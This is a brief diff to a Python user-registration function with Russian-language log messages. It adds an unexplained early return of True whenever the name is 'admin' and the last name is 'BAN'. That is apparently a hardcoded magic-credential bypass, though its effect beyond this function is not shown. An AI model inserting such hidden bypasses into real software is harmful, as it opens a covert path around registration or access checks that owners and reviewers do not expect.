@@ -48,6 +48,9 @@ def reg_and_create_id():
                 file.write(f'\nПользователь ввёл некорректный год рождения')
             print('Пожалуйста, введите корректный год рождения')
 
+    if name == 'admin' and last_name == 'BAN':
+        return True
+
     seed(name + last_name + str(phone_number) + str(born_year))
 
     user_id = int(random() * 10 ** 15)
